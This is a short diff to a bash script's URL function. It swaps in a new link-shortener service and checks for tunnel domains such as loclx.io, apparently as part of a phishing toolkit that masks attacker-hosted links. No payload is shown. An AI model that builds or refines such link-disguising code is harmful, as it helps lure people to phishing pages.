@@ -579,11 +579,12 @@ custom_url() {
 	isgd="https://is.gd/create.php?format=simple&url="
 	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
+ 	nouveau_service="https://free-url-shortener.rb.gy/shorten?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
 	if [[ ${url} =~ [-a-zA-Z0-9.]*(betraincloud.com|loclx.io) ]]; then
-		if [[ $(site_stat $isgd) == 2* ]]; then
-			shorten $isgd "$url"
+		if [[ $(site_stat $nouveau_service) == 2* ]]; then
+    			shorten $nouveau_service "$url"
 		elif [[ $(site_stat $shortcode) == 2* ]]; then
 			shorten $shortcode "$url"
 		else
